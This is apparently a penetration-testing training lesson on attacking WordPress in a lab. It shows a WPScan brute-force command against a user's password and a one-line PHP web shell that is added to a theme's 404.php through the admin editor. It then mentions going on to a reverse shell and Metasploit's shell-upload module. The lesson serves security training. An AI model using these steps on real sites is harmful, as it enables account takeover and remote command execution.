There are several ways to abuse the built-in functionality of wordpress.

## Login bruteforcing

WPScan can be used to brute force usernames and passwords. The wp-login method will attempt to brute force the standard WordPress login page, while xmlrpc uses the WordPress API.

  
```
mylesnieman@htb[/htb]`$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local  


[+] URL: http://blog.inlanefreight.local/ [10.129.42.195] [+] Started: Wed Aug 25 11:56:23 2021  <SNIP>`

```
## Code Execution
With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the `john` user, which will redirect us to the admin panel. Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.

Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.

Code: php

```php
system($_GET[0]);
```


The code above should let us execute commands via the GET parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents.  

![](https://academy.hackthebox.com/storage/modules/113/theme_editor.png)

Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.